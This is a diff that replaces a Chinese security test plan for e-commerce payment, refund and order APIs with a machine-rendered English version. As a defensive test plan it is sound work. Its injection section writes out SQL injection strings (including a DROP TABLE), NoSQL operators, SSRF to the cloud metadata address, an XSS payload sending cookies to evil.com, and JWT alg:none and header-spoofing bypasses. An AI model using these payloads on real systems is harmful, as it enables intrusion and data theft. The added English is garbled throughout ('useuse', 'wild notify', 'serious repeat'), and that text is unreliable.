-**预期结果**: 退款必须原路返回，不允许客户端指定退款目标账户
+**Expected Result**:
+- RefundAmountbyServerValidate, not information anyClientpass inject value
+- planRefundAmountnot super through real actualPaymentAmount
+- useuseinteger number(part)or Decimal advancelinesAmountCompute, avoid point precision degree ask problem
 
 ---
 
-### 5.4 退款状态篡改测试
+### 5.3 Refundtoaccount tamper change test
 
-**测试编号**: REFUND-004
-**风险等级**: 高
-**测试目标**: 验证退款状态不可被非法修改
+**Test ID**: REFUND-003
+**Risk Level**: Critical
+**Test Objective**: ValidateRefundcan onlyrefundtoprinciplePaymentAccount
 
-**测试步骤**:
-1. 发起退款申请（状态：待审核）
-2. 尝试直接调用接口跳过审核，将状态修改为"已退款"
-3. 管理员拒绝退款后，尝试重新将状态改为"待审核"或"已退款"
-4. 检查退款回调（支付宝/微信退款结果通知）是否有签名校验
-5. 伪造退款成功的回调通知
+**Test Steps**:
+1. initiate initiateRefundRequest, Checkwhether exists `refund_account` / `refund_to` etc.Field
+2. such asif existin, AttemptModifyasotherAlipay/WeChatAccount
+3. CheckRefundInterfacewhetherallow allow specified setRefundmethod mode(such asprinciple routeRefundbe changeasrefundtoBalance)
+4. CheckRefundRecordinofcollect payment methodwhetherandprinciplePaymentmethod one cause
 
-**预期结果**: 退款状态流转由后端控制，回调通知必须验证签名
-
----
-
-### 5.5 部分退款逻辑测试
-
-**测试编号**: REFUND-005
-**风险等级**: 高
-**测试目标**: 验证部分退款场景下的金额计算安全性
-
-**测试步骤**:
-1. 订单包含 3 件商品（A: 30元, B: 50元, C: 20元），总计 100 元，使用了 10 元优惠券，实付 90 元
-2. 对商品 A 发起退款，检查退款金额是否正确分摊了优惠券折扣
-3. 逐一对 A、B、C 分别退款，检查累计退款总额是否等于实付金额（90 元）
-4. 在分摊计算中，检查是否存在因四舍五入导致的"多退"或"少退"
-5. 修改退款请求中的商品数量（如只买了 1 件却申请退 2 件）
-
-**预期结果**:
-- 优惠金额按比例分摊到每件商品
-- 累计退款不超过实付金额
-- 最后一件商品退款时使用"总额 - 已退金额"计算，避免精度累积误差
+**Expected Result**: Refundmustprinciple routeReturn, not allow allowClientspecified setRefundTargetAccount
 
 ---
 
-## 六、通用安全测试
+### 5.4 RefundStatustamper change test
 
-### 6.1 接口认证与授权测试
+**Test ID**: REFUND-004
+**Risk Level**: High
+**Test Objective**: ValidateRefundStatusnotCanbeNon-methodModify
 
-**测试编号**: GEN-001
-**风险等级**: 高
+**Test Steps**:
+1. initiate initiateRefund please(Status:pending audit audit)
+2. AttemptDirect CallInterfaceskip through audit audit, willStatusModifyas"Refunded"
+3. Administratorreject rejectRefundafter, Attemptserious newwillStatuschangeas"pending audit audit"or"Refunded"
+4. CheckRefundCallback(Alipay/WeChatRefundResultwild notify)whether hasSignatureValidate
+5. forgeryRefundSuccessofCallbackwild notify
 
-**测试步骤**:
-1. 不带 Token / Cookie 直接调用以下接口，检查是否返回 401：
-   - `POST /api/order/create`
-   - `POST /api/payment/create`
-   - `POST /api/refund/create`
-   - `GET /api/order/list`
-2. 使用过期 Token 调用上述接口
-3. 使用无效/伪造 Token 调用上述接口
-4. 检查 Token 是否存在信息泄露（JWT 解码查看 payload 内容）
-5. 如果使用 JWT，测试算法混淆攻击（`alg: none`、RS256→HS256）
+**Expected Result**: RefundStatusflow transfer byBackendcontrol make, Callbackwild notifymustValidateSignature
 
 ---
 
-### 6.2 请求速率限制测试
+### 5.5 part partRefundlogic logic test
 
-**测试编号**: GEN-002
-**风险等级**: 中
+**Test ID**: REFUND-005
+**Risk Level**: High
+**Test Objective**: Validatepart partRefundscenario scene underofAmountComputeSecureness
 
-**测试步骤**:
-1. 对创建订单接口进行高频调用（每秒 100 次），检查是否有限流
-2. 对支付接口进行高频调用，检查是否触发风控
-3. 对退款接口进行高频调用
-4. 检查限流策略是基于 IP、用户ID 还是两者结合
-5. 测试绕过限流：更换 IP、更换 User-Agent、添加 `X-Forwarded-For` 头
+**Test Steps**:
+1. Orderinclude include 3 item commerce product(A: 30yuan, B: 50yuan, C: 20yuan), total plan 100 yuan, useusedone 10 yuanCoupon, real pay 90 yuan
+2. for commerce product A initiate initiateRefund, CheckRefundAmountwhethercorrect confirm part doneCoupondiscount deduct
+3. one by one for A/B/C part levelRefund, Check planRefundtotal amountwhetheretc.for real payAmount(90 yuan)
+4. inpart Computein, Checkwhether existsbecause four injectCausingof"over-refund"or"under-refund"
+5. ModifyRefundRequestinofcommerce product number quantity(such asonly buy done 1 item please refund 2 item)
 
----
-
-### 6.3 参数注入测试
-
-**测试编号**: GEN-003
-**风险等级**: 高
-
-**测试步骤**:
-1. 在订单相关接口的参数中注入 SQL：
-   - `order_id=10001' OR 1=1--`
-   - `order_id=10001; DROP TABLE orders;--`
-2. 在搜索/查询接口注入 NoSQL（如 MongoDB）：
-   - `{"order_id": {"$gt": ""}}`
-   - `{"status": {"$ne": null}}`
-3. 在涉及回调 URL 的参数中测试 SSRF：
-   - `notify_url=http://169.254.169.254/latest/meta-data/`
-   - `return_url=http://internal-server:8080/admin`
-4. 在商品名称、收货地址、退款原因等文本字段中注入 XSS：
-   - `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`
-   - `"><img src=x onerror=alert(1)>`
+**Expected Result**:
+- priority Amountby ratiocasespart toeach item commerce product
+- planRefundnot super through real payAmount
+- most after one item commerce productRefundtime useuse"total amount - already refundAmount"Compute, avoid precision degree cumulative error error
 
 ---
 
-### 6.4 业务逻辑绕过测试
+## 6. wilduseSecuretest
 
-**测试编号**: GEN-004
-**风险等级**: 高
+### 6.1 InterfaceAuthenticationandAuthorizationtest
 
-**测试步骤**:
+**Test ID**: GEN-001
+**Risk Level**: High
 
-#### 6.4.1 流程跳过
-1. 不经过购物车，直接调用创建订单接口
-2. 不经过订单创建，直接调用支付接口
-3. 跳过地址填写步骤，直接提交订单
-
-#### 6.4.2 参数污染
-1. 同一请求中传入多个 `order_id` 参数：`order_id=10001&order_id=10002`
-2. JSON 中传入重复键：`{"amount": 100, "amount": 0.01}`
-3. 在 POST body 和 URL query 中同时传入 `order_id`，观察服务端取哪个值
-
-#### 6.4.3 时序攻击
-1. 在优惠券到期前一瞬间发起下单请求（边界时间测试）
-2. 在限时特价结束的瞬间并发下单
-3. 检查服务端的时间校验是否存在时区问题
+**Test Steps**:
+1. not with Token / Cookie Direct Callthe followingInterface, CheckwhetherReturn 401:
+ - `POST /api/order/create`
+ - `POST /api/payment/create`
+ - `POST /api/refund/create`
+ - `GET /api/order/list`
+2. useuseexpired Token Callabove descriptionInterface
+3. useuseno valid/forgery Token Callabove descriptionInterface
+4. Check Token whether existsInformation Disclosure(JWT decode codeView payload content)
+5. such asif useuse JWT, test algorithm method mix attack attack(`alg: none`/RS256->HS256)
 
 ---
 
-### 6.5 敏感数据保护测试
+### 6.2 Requestrate rate limit make test
 
-**测试编号**: GEN-005
-**风险等级**: 高
+**Test ID**: GEN-002
+**Risk Level**: in
 
-**测试步骤**:
-1. 检查支付页面是否强制使用 HTTPS
-2. 检查支付相关 Cookie 是否设置了 `Secure`、`HttpOnly`、`SameSite` 属性
-3. 检查支付相关接口的响应头：
-   - `Strict-Transport-Security` (HSTS)
-   - `Content-Security-Policy` (CSP)
-   - `X-Content-Type-Options: nosniff`
-4. 检查支付日志中是否记录了完整银行卡号、CVV、支付密码等敏感信息
-5. 检查数据库中支付信息的存储方式（是否加密）
+**Test Steps**:
+1. forCreate OrderInterfaceadvancelinesHighfrequencyCall(each 100 times), check whether there isRate Limiting
+2. forPaymentInterfaceadvancelinesHighfrequencyCall, Checkwhethertrigger risk control
+3. forRefundInterfaceadvancelinesHighfrequencyCall
+4. CheckRate Limitingpolicy strategy is based on IP/UserID is two person result combine
+5. testBypassRate Limiting:update change IP/update change User-Agent/Add `X-Forwarded-For` Header
 
 ---
 
-## 七、支付宝/微信特定安全测试
+### 6.3 Parameterinject inject test
 
-### 7.1 支付宝集成安全检查
+**Test ID**: GEN-003
+**Risk Level**: High
 
-**测试编号**: ALIPAY-001
-**风险等级**: 高
+**Test Steps**:
+1. inOrderrelated keyInterfaceofParameterininject inject SQL:
+ - `order_id=10001' OR 1=1--`
+ - `order_id=10001; DROP TABLE orders;--`
+2. insearch/check queryInterfaceinject inject NoSQL(such as MongoDB):
+ - `{"order_id": {"$gt": ""}}`
+ - `{"status": {"$ne": null}}`
+3. ininvolvingCallback URL ofParameterintest SSRF:
+ - `notify_url=http://169.254.169.254/latest/meta-data/`
+ - `return_url=http://internal-server:8080/admin`
+4. incommerce product name name/collect goodsAddress/Refundprinciple becauseetc.textFieldininject inject XSS:
+ - `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`
+ - `"><img src=x onerror=alert(1)>`
 
-**检查项**:
+---
 
-| 检查点 | 安全要求 | 检查方法 |
+### 6.4 business logic logicBypasstest
+
+**Test ID**: GEN-004
+**Risk Level**: High
+
+**Test Steps**:
+
+#### 6.4.1 flow process skip through
+1. without going throughShopping Cart, Direct CallCreate OrderInterface
+2. without going throughOrderCreate, Direct CallPaymentInterface
+3. skip throughAddressfill inStep, DirectSubmitOrder
+
+#### 6.4.2 Parameter Pollution
+1. SameRequestinpass inject many `order_id` Parameter:`order_id=10001&order_id=10002`
+2. JSON inpass inject serious repeat key:`{"amount": 100, "amount": 0.01}`
+3. in POST body and URL query insame time pass inject `order_id`, ObserveServertake which value
+
+#### 6.4.3 time sequence attack attack
+1. inCoupontoperiod first one instant initiate initiate under singleRequest(boundary boundary time between test)
+2. inlimited-time sale endsofinstantConcurrencyunder single
+3. CheckServeroftime betweenValidatewhether existstime ask problem
+
+---
+
+### 6.5 sensitive sensitiveDataprotect protect test
+
+**Test ID**: GEN-005
+**Risk Level**: High
+
+**Test Steps**:
+1. CheckPaymentpagewhetherstrong make useuse HTTPS
+2. CheckPaymentrelated key Cookie whetherset set done `Secure`/`HttpOnly`/`SameSite` attributes
+3. CheckPaymentrelated keyInterfaceofResponseHeader:
+ - `Strict-Transport-Security` (HSTS)
+ - `Content-Security-Policy` (CSP)
+ - `X-Content-Type-Options: nosniff`
+4. CheckPaymentLoginwhetherRecorddoneCompletebanklinescard number/CVV/PaymentPasswordetc.Sensitive Information
+5. CheckDatabaseinPaymentinformationofStoragemethod mode(whetheradd secret)
+
+---
+
+## 7. Alipay/WeChatspecial setSecuretest
+
+### 7.1 Alipaycollect completeSecureCheck
+
+**Test ID**: ALIPAY-001
+**Risk Level**: High
+
+**Check Item**:
+
+| Checkpoint | Secureneed require | Check Method |
 |--------|---------|---------|
-| 签名算法 | RSA2 (SHA256WithRSA) | 查看代码中 `sign_type` 配置 |
-| 证书模式 | 建议使用证书模式而非公钥模式 | 检查是否使用 `alipay_cert_path` |
-| notify_url | HTTPS + 域名不可被用户控制 | 检查是否硬编码或从配置读取 |
-| return_url | 仅用于前端跳转，不做业务判断 | 检查 return 回调是否触发发货等操作 |
-| app_id | 与实际商户号一致 | 对比配置与支付宝后台 |
-| 主动查询 | 收到回调后应主动调用 `alipay.trade.query` 二次确认 | 检查回调处理代码 |
-| 关单 | 订单超时应调用 `alipay.trade.close` | 检查超时处理逻辑 |
+| Signaturealgorithm method | RSA2 (SHA256WithRSA) | ViewCodein `sign_type` Configuration |
+| cert certificate mode | create protocol useusecert certificate mode whileNon-company mode | Checkwhetheruseuse `alipay_cert_path` |
+| notify_url | HTTPS + Domain NamenotCanbeUsercontrol make | CheckwhetherhardEncodingorfromConfigurationRead |
+| return_url | onlyuseforFrontendskip transfer, does not make business decisions | Check return Callbackwhethertrigger initiate shippingetc.operation |
+| app_id | andreal actual commerce account number one cause | for ratioConfigurationandAlipaybackend console |
+| primary dynamic check query | collecttoCallbackaftershouldprimary dynamicCall `alipay.trade.query` twotimesConfirm | CheckCallbackhandle manageCode |
+| key single | Ordersuper timeshouldCall `alipay.trade.close` | Checksuper time handle manage logic logic |
 
 ---
 
-### 7.2 微信支付集成安全检查
+### 7.2 WeChatPaymentcollect completeSecureCheck
 
-**测试编号**: WXPAY-001
-**风险等级**: 高
+**Test ID**: WXPAY-001
+**Risk Level**: High
 
-**检查项**:
+**Check Item**:
 
-| 检查点 | 安全要求 | 检查方法 |
+| Checkpoint | Secureneed require | Check Method |
 |--------|---------|---------|
-| API 版本 | 使用 V3 接口 | 检查请求 URL 是否为 `/v3/` 前缀 |
-| 签名方式 | AEAD_AES_256_GCM + SHA256-RSA2048 | 检查签名代码 |
-| 证书管理 | 使用平台证书自动更新机制 | 检查是否定期轮换证书 |
-| mch_id | 商户号不可被篡改 | 检查是否硬编码在服务端 |
-| 回调解密 | 使用 APIv3 密钥解密通知体 | 检查 `resource.ciphertext` 的解密逻辑 |
-| JSAPI 参数 | `prepay_id` 等参数由后端生成并签名 | 检查前端获取支付参数的流程 |
+| API version version | useuse V3 Interface | CheckRequest URL whether is `/v3/` prefix |
+| Signaturemethod mode | AEAD_AES_256_GCM + SHA256-RSA2048 | CheckSignatureCode |
+| cert certificate manage manage | useusePlatformcert certificate self dynamicUpdatemachine make | Checkwhetherset period rotate change cert certificate |
+| mch_id | commerce account number notCanbe tamper change | CheckwhetherhardEncodinginServer |
+| Callbackdecrypt | useuse APIv3 Keydecrypt wild notify body | Check `resource.ciphertext` ofdecrypt logic logic |
+| JSAPI Parameter | `prepay_id` etc.ParameterbyBackendgenerate andSignature | CheckFrontendObtainPaymentParameterofflow process |
 
 ---
 
-## 八、测试工具清单
+## 8. testToolclear single
 
-| 工具 | 用途 |
+| Tool | Purpose |
 |------|------|
-| Burp Suite Professional | HTTP(S) 请求拦截、修改、重放 |
-| Postman / cURL | 接口调试与手动测试 |
-| Python + aiohttp | 并发请求脚本（竞态条件测试） |
-| sqlmap | SQL 注入自动化检测 |
-| OWASP ZAP | 自动化漏洞扫描 |
-| Wireshark / tcpdump | 网络层抓包分析 |
-| JWT.io / jwt_tool | JWT Token 分析与伪造 |
-| IDE + 代码审计 | 源代码级别的安全审计 |
+| Burp Suite Professional | HTTP(S) Request Interception/Modify/Replay |
+| Postman / cURL | Interfacedebuggingandmobile dynamic test |
+| Python + aiohttp | ConcurrencyRequestScript(Race Conditiontest) |
+| sqlmap | SQL inject inject self dynamic ize check test |
+| OWASP ZAP | self dynamic ize vulnerabilityScan |
+| Wireshark / tcpdump | Networklayer packet captureAnalyze |
+| JWT.io / jwt_tool | JWT Token Analyzeandforgery |
+| IDE + Codeaudit plan | Source Codelevel levelofSecureaudit plan |
 
 ---
 
-## 九、测试优先级矩阵
+## 9. testPrioritymatrix matrix
 
-按风险等级和利用难度排序，建议测试顺序：
+byRisk Levelandexploituse degree rank sequence, create protocol test order sequence:
 
-| 优先级 | 测试编号 | 测试项 | 风险 | 理由 |
+| Priority | Test ID | Test Item | risk | Reason |
 |--------|---------|--------|------|------|
-| P0 | PAY-002 | 支付回调伪造 | 极高 | 直接导致0元购，自动化利用 |
-| P0 | PAY-001 | 支付金额篡改 | 极高 | 直接经济损失 |
-| P0 | REFUND-001 | 重复退款 | 极高 | 直接资金损失，可自动化利用 |
-| P0 | REFUND-002 | 超额退款 | 极高 | 直接资金损失 |
-| P1 | CART-001 | 价格篡改 | 极高 | 0元购或低价购 |
-| P1 | PAY-006 | 签名安全 | 极高 | 根基性安全问题 |
-| P1 | REFUND-003 | 退款到账篡改 | 极高 | 资金流向异常 |
-| P1 | ORDER-001 | 越权访问 | 高 | 隐私泄露 + 业务操作 |
-| P2 | CART-003 | 库存竞态 | 高 | 超卖经济损失 |
-| P2 | ORDER-003 | 状态机完整性 | 高 | 业务逻辑异常 |
-| P2 | CART-004 | 优惠券逻辑 | 高 | 经济损失 |
-| P2 | GEN-003 | 参数注入 | 高 | 数据泄露/系统入侵 |
-| P3 | CART-002 | 数量溢出 | 高 | 计算异常 |
-| P3 | PAY-003 | 状态轮询篡改 | 高 | 前端欺骗 |
-| P3 | PAY-004 | 支付超时 | 中 | 资金悬挂 |
-| P3 | PAY-005 | 支付方式切换 | 中 | 重复支付 |
-| P4 | GEN-001 | 认证授权 | 高 | 基础安全 |
-| P4 | GEN-002 | 速率限制 | 中 | 防滥用 |
-| P4 | GEN-005 | 敏感数据保护 | 高 | 合规要求 |
+| P0 | PAY-002 | Payment Callback Forgery | Critical | DirectCausing0yuanbuy, self dynamic ize exploituse |
+| P0 | PAY-001 | Payment Amount Tampering | Critical | Directfinancial loss |
+| P0 | REFUND-001 | Duplicate Refund | Critical | Directresource funds loss loss, Canself dynamic ize exploituse |
+| P0 | REFUND-002 | super amountRefund | Critical | Directresource funds loss loss |
+| P1 | CART-001 | price format tamper change | Critical | 0yuanbuyorLowprice buy |
+| P1 | PAY-006 | SignatureSecure | Critical | root base nessSecureask problem |
+| P1 | REFUND-003 | Refundtoaccount tamper change | Critical | resource funds flow toward abnormal common |
+| P1 | ORDER-001 | Authorization Bypass | High | hidden privateDisclosure + business operation |
+| P2 | CART-003 | InventoryRace | High | super financial loss |
+| P2 | ORDER-003 | StatusmachineCompleteness | High | business logic logic abnormal common |
+| P2 | CART-004 | Couponlogic logic | High | financial loss |
+| P2 | GEN-003 | Parameterinject inject | High | DataDisclosure/Systeminject |
+| P3 | CART-002 | number quantity out | High | Computeabnormal common |
+| P3 | PAY-003 | Statusrotate query tamper change | High | Frontend |
+| P3 | PAY-004 | Paymentsuper time | in | resource funds |
+| P3 | PAY-005 | Paymentmethod mode switch change | in | serious repeatPayment |
+| P4 | GEN-001 | AuthenticationAuthorization | High | base foundationSecure |
+| P4 | GEN-002 | rate rate limit make | in | defense abuseuse |
+| P4 | GEN-005 | sensitive sensitiveDataprotect protect | High | combine scale need require |
 
 ---
 
-## 十、测试报告模板
+## 10. Test Report Template
 
-每个测试点完成后，按以下格式记录结果：
+EachTest Pointcomplete after, bythe followingformat modeRecordResult:
 
 ```
-### [测试编号] 测试项名称
+### [Test ID] Test Itemname name
 
-- **测试时间**: YYYY-MM-DD HH:MM
-- **测试人员**:
-- **测试结果**: 通过 / 失败 / 存在风险
-- **风险等级**: 低 / 中 / 高 / 极高
-- **复现步骤**: （如失败，详细记录复现方法）
-- **请求样本**: （关键的 HTTP 请求/响应截图或文本）
-- **影响范围**: （受影响的用户群体和业务场景）
-- **修复建议**: （具体的技术修复方案）
-- **验证状态**: 待修复 / 已修复待验证 / 已验证
+- **Test Time**: YYYY-MM-DD HH:MM
+- **tester**:
+- **Test Result**: Pass / Failure / existinrisk
+- **Risk Level**: Low / in / High / Critical
+- **Reproduction Steps**: (such asFailure, DetailedRecordrepeat currentMethod)
+- **Request version**: (keyof HTTP Request/Responseintercept imageortext)
+- **Impact Scope**: (affected impact responseofUser bodyandbusiness scenario scene)
+- **Remediation Recommendation**: (Concreteoftechnique fix repeat method plan)
+- **ValidateStatus**: pending remediation / already fix repeat pendingValidate / alreadyValidate
 ```
 
 ---
 
-## 十一、常见漏洞修复建议速查
+## ten1. common vulnerabilitiesRemediation Recommendationrate check
 
-| 漏洞类型 | 修复方案 |
+| Vulnerability Type | fix repeat method plan |
 |----------|---------|
-| 金额篡改 | 服务端从数据库读取金额，忽略客户端传值；创建支付单时再次校验 |
-| 回调伪造 | 验证签名 + 验证来源IP + 主动查询支付平台确认 |
-| 重复退款 | 数据库唯一约束 + 分布式锁 + 幂等键 |
-| 超额退款 | 累计退款金额校验 + 使用整数（分）计算 |
-| 竞态条件 | 数据库乐观锁（版本号）或悲观锁（SELECT FOR UPDATE）+ Redis 分布式锁 |
-| 越权访问 | 所有查询加 `WHERE user_id = :current_user_id` 条件 |
-| 状态机绕过 | 服务端实现状态机，不暴露通用状态更新接口 |
-| 订单号枚举 | 使用 UUID/雪花算法 + 权限校验双重保护 |
+| Amount Tampering | ServerfromDatabaseReadAmount, ignoreClientpass value;CreatePaymentsingle time againtimesValidate |
+| Callbackforgery | ValidateSignature + Validatecome sourceIP + primary dynamic check queryPaymentPlatformConfirm |
+| Duplicate Refund | Databaseunique constraint + Distributed Lock + Idempotencykey |
+| super amountRefund | planRefundAmountValidate + useuseinteger number(part)Compute |
+| Race Condition | Databaseoptimistic lock(version version number)orpessimistic lock(SELECT FOR UPDATE)+ Redis Distributed Lock |
+| Authorization Bypass | Allcheck query add `WHERE user_id =:current_user_id` condition |
+| State-Machine Bypass | Serverreal currentStatusmachine, not expose exposure wilduseStatusUpdateInterface |
+| OrdernumberEnumeration | useuse UUID/ flower algorithm method + PermissionValidatedual serious protect protect |
